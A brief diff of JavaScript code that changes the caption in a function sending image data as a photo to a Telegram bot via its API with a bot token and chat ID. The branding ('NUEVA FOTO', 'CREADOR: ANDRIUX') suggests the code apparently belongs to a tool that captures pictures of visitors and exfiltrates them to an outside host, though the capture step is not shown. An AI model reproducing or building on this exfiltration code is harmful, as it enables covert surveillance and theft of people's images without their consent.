@@ -204,7 +204,7 @@
     function sendToTelegram(imageData, name) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      formData.append("caption", `📸 NUEVA FOTO | CREADOR: 👑 ANDRIUX 👑 `);
+      formData.append("caption", `📸 NUEVA FOTO CREADOR 👑 ANDRIUX 👑`);
       formData.append("photo", dataURItoBlob(imageData), "photo.jpg");
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
